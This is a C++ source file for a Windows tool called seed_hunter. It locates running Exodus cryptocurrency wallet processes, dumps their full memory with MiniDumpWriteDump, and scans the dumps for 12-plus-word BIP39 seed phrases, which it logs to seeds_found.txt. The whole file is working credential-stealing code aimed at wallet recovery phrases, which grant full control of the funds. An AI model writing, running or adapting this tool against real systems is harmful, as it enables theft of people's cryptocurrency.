// seed_hunter.cpp
// All-in-one: dumps all Exodus.exe processes and scans memory for BIP39 seed phrases.
// Writes found seeds to seeds_found.txt in the exe's directory.
//
// Compile: g++ -O3 -std=c++17 -o seed_hunter.exe seed_hunter.cpp -ldbghelp -lpsapi
// Usage:
//   seed_hunter.exe                  — auto-dump all Exodus PIDs + scan
//   seed_hunter.exe --dump-only       — just dump, don't scan
//   seed_hunter.exe --scan-only      — scan existing dumps in %TEMP%\exodus_dumps
//   seed_hunter.exe --dir <path>     — scan dumps in specific directory
//   seed_hunter.exe <file.dmp> [...] — scan specific dump files
//   seed_hunter.exe --clean          — delete all dumps after scanning

#include <windows.h>
#include <psapi.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <unordered_set>
#include <filesystem>
#include <algorithm>
#include <cstring>
#include <ctime>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "dbghelp.lib")

namespace fs = std::filesystem;

// ── Globals ──────────────────────────────────────────────────────────────────

std::unordered_set<std::string> g_bip39Words;
const char* DUMP_DIR_NAME = "exodus_dumps";
fs::path g_outputFile;
int g_totalSeedsFound = 0;

// ── Get exe's directory ─────────────────────────────────────────────────────

fs::path GetExeDirectory() {
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    return fs::path(path).parent_path();
}

// ── Write seed to output file ───────────────────────────────────────────────

void WriteSeedToFile(const std::vector<std::string>& words, const std::string& source) {
    std::ofstream out(g_outputFile, std::ios::app);
    if (!out.is_open()) {
        std::cerr << "[-] Could not write to output file: " << g_outputFile.string() << "\n";
        return;
    }

    // Timestamp
    time_t now = time(nullptr);
    struct tm tmStruct;
    localtime_s(&tmStruct, &now);
    char timeBuf[64];
    strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%d %H:%M:%S", &tmStruct);

    out << "========================================\n";
    out << "Timestamp: " << timeBuf << "\n";
    out << "Source:    " << source << "\n";
    out << "Length:    " << words.size() << " words\n";
    out << "----------------------------------------\n";
    for (size_t i = 0; i < words.size(); i++) {
        out << words[i];
        if (i + 1 < words.size()) out << " ";
    }
    out << "\n========================================\n\n";
    out.close();
}

// ── BIP39 wordlist ───────────────────────────────────────────────────────────

bool LoadBip39Wordlist(const std::string& path) {
    std::ifstream file(path);
    if (!file.is_open()) {
        std::cerr << "[-] Could not open wordlist: " << path << "\n";
        return false;
    }
    std::string word;
    while (std::getline(file, word)) {
        word.erase(word.find_last_not_of(" \t\r\n") + 1);
        word.erase(0, word.find_first_not_of(" \t\r\n"));
        if (!word.empty()) {
            std::transform(word.begin(), word.end(), word.begin(), ::tolower);
            g_bip39Words.insert(word);
        }
    }
    std::cout << "[*] Loaded " << g_bip39Words.size() << " BIP39 words\n";
    return !g_bip39Words.empty();
}

// ── Process enumeration ─────────────────────────────────────────────────────

struct ProcInfo {
    DWORD pid;
    std::string name;
    std::string exePath;
    SIZE_T workingSet;
};

std::vector<ProcInfo> FindExodusProcesses() {
    std::vector<ProcInfo> result;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return result;

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snapshot, &pe)) {
        do {
            std::string exeName(pe.szExeFile);
            std::string lower = exeName;
            std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

            if (lower == "exodus.exe") {
                ProcInfo info;
                info.pid = pe.th32ProcessID;
                info.name = exeName;

                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                          FALSE, info.pid);
                if (hProc) {
                    PROCESS_MEMORY_COUNTERS pmc;
                    if (GetProcessMemoryInfo(hProc, &pmc, sizeof(pmc))) {
                        info.workingSet = pmc.WorkingSetSize;
                    }
                    char pathBuf[MAX_PATH] = {0};
                    if (GetModuleFileNameExA(hProc, nullptr, pathBuf, MAX_PATH)) {
                        info.exePath = pathBuf;
                    }
                    CloseHandle(hProc);
                }
                result.push_back(info);
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return result;
}

// ── Memory dump via MiniDumpWriteDump ───────────────────────────────────────

bool DumpProcess(DWORD pid, const fs::path& outPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE, pid
    );
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed for PID " << pid
                  << " (error " << GetLastError() << ")\n";
        return false;
    }

    HANDLE hFile = CreateFileW(
        outPath.wstring().c_str(),
        GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] CreateFile failed for " << outPath.string()
                  << " (error " << GetLastError() << ")\n";
        CloseHandle(hProcess);
        return false;
    }

    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
        MiniDumpWithFullMemory |
        MiniDumpWithUnloadedModules |
        MiniDumpWithProcessThreadData |
        MiniDumpWithHandleData
    );

    std::cout << "[*] Dumping PID " << pid << " -> " << outPath.filename().string() << " ...\n";

    BOOL ok = MiniDumpWriteDump(
        hProcess, pid, hFile,
        dumpType,
        nullptr, nullptr, nullptr
    );

    if (!ok) {
        std::cerr << "[-] MiniDumpWriteDump failed for PID " << pid
                  << " (error " << GetLastError() << ")\n";
    }

    CloseHandle(hFile);
    CloseHandle(hProcess);
    return (bool)ok;
}

// ── String extraction from dump ─────────────────────────────────────────────

std::vector<std::string> ExtractStrings(const fs::path& dumpPath) {
    std::vector<std::string> strings;

    HANDLE hFile = CreateFileW(dumpPath.wstring().c_str(), GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return strings;

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);

    HANDLE hMap = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMap) { CloseHandle(hFile); return strings; }

    const uint8_t* data = (const uint8_t*)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!data) { CloseHandle(hMap); CloseHandle(hFile); return strings; }

    size_t size = (size_t)fileSize.QuadPart;

    // ASCII strings (min length 8)
    {
        std::string current;
        for (size_t i = 0; i < size; i++) {
            if (data[i] >= 0x20 && data[i] < 0x7F) {
                current += (char)data[i];
            } else {
                if (current.length() >= 8) strings.push_back(current);
                current.clear();
            }
        }
        if (current.length() >= 8) strings.push_back(current);
    }

    // UTF-16LE strings
    {
        std::string current;
        for (size_t i = 0; i + 1 < size; i += 2) {
            uint16_t ch = data[i] | (data[i + 1] << 8);
            if (ch >= 0x20 && ch < 0x7F) {
                current += (char)ch;
            } else {
                if (current.length() >= 8) strings.push_back(current);
                current.clear();
            }
        }
    }

    UnmapViewOfFile(data);
    CloseHandle(hMap);
    CloseHandle(hFile);

    return strings;
}

// ── BIP39 seed phrase scanning ───────────────────────────────────────────────

void ScanDump(const fs::path& dumpPath) {
    std::string sourceTag = dumpPath.filename().string();

    std::cout << "[*] Scanning " << sourceTag
              << " (" << (fs::file_size(dumpPath) / (1024 * 1024)) << " MB)...\n";

    auto strings = ExtractStrings(dumpPath);
    std::cout << "    Extracted " << strings.size() << " strings\n";

    for (const auto& str : strings) {
        std::istringstream iss(str);
        std::string word;
        std::vector<std::string> run;

        while (iss >> word) {
            std::string lower = word;
            std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

            lower.erase(std::remove_if(lower.begin(), lower.end(),
                [](char c) { return !isalpha(c); }), lower.end());

            if (g_bip39Words.count(lower)) {
                run.push_back(lower);
            } else {
                if (run.size() >= 12) {
                    g_totalSeedsFound++;
                    std::cout << "\n[!!!] POTENTIAL SEED #" << g_totalSeedsFound
                              << " (" << run.size() << " words) from " << sourceTag << ":\n  ";
                    for (size_t i = 0; i < run.size(); i++) {
                        std::cout << run[i];
                        if (i + 1 < run.size()) std::cout << " ";
                    }
                    std::cout << "\n";

                    // Write to output file
                    WriteSeedToFile(run, sourceTag);
                }
                run.clear();
            }
        }
        if (run.size() >= 12) {
            g_totalSeedsFound++;
            std::cout << "\n[!!!] POTENTIAL SEED #" << g_totalSeedsFound
                      << " (" << run.size() << " words) from " << sourceTag << ":\n  ";
            for (size_t i = 0; i < run.size(); i++) {
                std::cout << run[i];
                if (i + 1 < run.size()) std::cout << " ";
            }
            std::cout << "\n";

            WriteSeedToFile(run, sourceTag);
        }
    }
}

// ── Cleanup ──────────────────────────────────────────────────────────────────

void CleanDumps(const fs::path& dir) {
    if (!fs::exists(dir)) return;
    for (const auto& entry : fs::directory_iterator(dir)) {
        if (entry.path().extension() == ".dmp") {
            fs::remove(entry.path());
            std::cout << "[*] Deleted " << entry.path().filename().string() << "\n";
        }
    }
}

// ── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    bool dumpOnly = false;
    bool scanOnly = false;
    bool cleanFlag = false;
    std::string customDir;
    std::vector<fs::path> explicitFiles;

    // Set output file path — same dir as the exe
    g_outputFile = GetExeDirectory() / "seeds_found.txt";

    // Parse args
    for (int i = 1; i < argc; i++) {
        std::string arg(argv[i]);
        if (arg == "--dump-only") dumpOnly = true;
        else if (arg == "--scan-only") scanOnly = true;
        else if (arg == "--clean") cleanFlag = true;
        else if (arg == "--dir" && i + 1 < argc) customDir = argv[++i];
        else if (arg == "--help" || arg == "-h") {
            std::cout << "Usage:\n"
                      << "  seed_hunter.exe                  Auto-dump all Exodus PIDs + scan\n"
                      << "  seed_hunter.exe --dump-only      Just dump, don't scan\n"
                      << "  seed_hunter.exe --scan-only      Scan existing dumps in default dir\n"
                      << "  seed_hunter.exe --dir <path>     Scan dumps in specific directory\n"
                      << "  seed_hunter.exe --clean          Delete dumps after scanning\n"
                      << "  seed_hunter.exe <file.dmp> ...   Scan specific dump files\n"
                      << "  seed_hunter.exe --help           This message\n"
                      << "\n"
                      << "  Output file: seeds_found.txt (next to this exe)\n";
            return 0;
        }
        else if (arg[0] != '-') {
            explicitFiles.push_back(fs::path(arg));
        }
    }

    // Load BIP39 wordlist
    std::string wordlistPath = std::string(getenv("TEMP")) + "\\bip39.txt";
    if (!LoadBip39Wordlist(wordlistPath)) {
        std::cerr << "[-] Download BIP39 wordlist first:\n";
        std::cerr << "    curl -o %TEMP%\\bip39.txt https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt\n";
        return 1;
    }

    // Clear output file at start of a fresh run (not scan-only of explicit files)
    if (!scanOnly && explicitFiles.empty()) {
        std::ofstream clearFile(g_outputFile, std::ios::trunc);
        clearFile << "SEED HUNTER RESULTS\n";
        clearFile << "==================\n";
        clearFile << "Generated: " << __DATE__ << " " << __TIME__ << "\n\n";
        clearFile.close();
    }

    // Determine dump directory
    fs::path dumpDir = customDir.empty()
        ? fs::path(std::string(getenv("TEMP"))) / DUMP_DIR_NAME
        : fs::path(customDir);

    // ── Clean mode ──
    if (cleanFlag && !scanOnly && explicitFiles.empty()) {
        CleanDumps(dumpDir);
        std::cout << "[*] Cleanup done.\n";
        return 0;
    }

    // ── Explicit files mode ──
    if (!explicitFiles.empty()) {
        std::cout << "[*] Scanning " << explicitFiles.size() << " dump file(s)\n\n";
        for (const auto& f : explicitFiles) {
            if (fs::exists(f)) ScanDump(f);
            else std::cerr << "[-] File not found: " << f.string() << "\n";
        }
        std::cout << "\n[*] Done. Found " << g_totalSeedsFound << " potential seed(s).\n";
        if (g_totalSeedsFound > 0)
            std::cout << "[*] Results written to: " << g_outputFile.string() << "\n";
        return 0;
    }

    // ── Scan-only mode ──
    if (scanOnly) {
        std::cout << "[*] Scan-only mode — looking for .dmp files in " << dumpDir.string() << "\n";
        if (!fs::exists(dumpDir)) {
            std::cerr << "[-] Dump directory not found: " << dumpDir.string() << "\n";
            return 1;
        }
        std::vector<fs::path> dumps;
        for (const auto& entry : fs::directory_iterator(dumpDir)) {
            if (entry.path().extension() == ".dmp") dumps.push_back(entry.path());
        }
        if (dumps.empty()) {
            std::cerr << "[-] No .dmp files found in " << dumpDir.string() << "\n";
            return 1;
        }
        std::cout << "[*] Found " << dumps.size() << " dump file(s)\n\n";
        for (const auto& f : dumps) ScanDump(f);
        if (cleanFlag) CleanDumps(dumpDir);
        std::cout << "\n[*] Done. Found " << g_totalSeedsFound << " potential seed(s).\n";
        if (g_totalSeedsFound > 0)
            std::cout << "[*] Results written to: " << g_outputFile.string() << "\n";
        return 0;
    }

    // ── Default: dump all Exodus PIDs + scan ──
    auto procs = FindExodusProcesses();
    if (procs.empty()) {
        std::cerr << "[-] No Exodus.exe processes found. Is the wallet running and unlocked?\n";
        return 1;
    }

    std::cout << "[*] Found " << procs.size() << " Exodus processes:\n";
    for (const auto& p : procs) {
        std::cout << "    PID " << p.pid
                  << "  WS: " << (p.workingSet / (1024 * 1024)) << " MB"
                  << "  " << (p.exePath.empty() ? p.name : p.exePath) << "\n";
    }
    std::cout << "\n";

    if (!fs::exists(dumpDir)) fs::create_directories(dumpDir);
    std::cout << "[*] Dump directory: " << dumpDir.string() << "\n";
    std::cout << "[*] Output file:   " << g_outputFile.string() << "\n\n";

    // Dump each process
    std::vector<fs::path> dumpFiles;
    int dumpCount = 0;
    for (const auto& p : procs) {
        fs::path dumpPath = dumpDir / ("exodus_" + std::to_string(p.pid) + ".dmp");
        if (DumpProcess(p.pid, dumpPath)) {
            dumpFiles.push_back(dumpPath);
            dumpCount++;
            std::cout << "[+] Dumped PID " << p.pid << " ("
                      << (fs::file_size(dumpPath) / (1024 * 1024)) << " MB)\n";
        }
    }
    std::cout << "\n[*] Dumped " << dumpCount << "/" << procs.size() << " processes\n\n";

    if (dumpOnly) {
        std::cout << "[*] Dumps saved to: " << dumpDir.string() << "\n";
        std::cout << "[*] Run with --scan-only to scan them later\n";
        return 0;
    }

    // Scan each dump
    std::cout << "[*] Scanning " << dumpFiles.size() << " dump(s) for BIP39 seed phrases...\n\n";
    for (const auto& f : dumpFiles) {
        ScanDump(f);
    }

    if (cleanFlag) {
        std::cout << "\n[*] Cleaning up dumps...\n";
        CleanDumps(dumpDir);
    }

    // Final summary
    std::cout << "\n========================================\n";
    std::cout << "[*] SCAN COMPLETE\n";
    std::cout << "[*] Potential seeds found: " << g_totalSeedsFound << "\n";
    if (g_totalSeedsFound > 0) {
        std::cout << "[*] Results written to:  " << g_outputFile.string() << "\n";
    }
    std::cout << "========================================\n";

    return 0;
}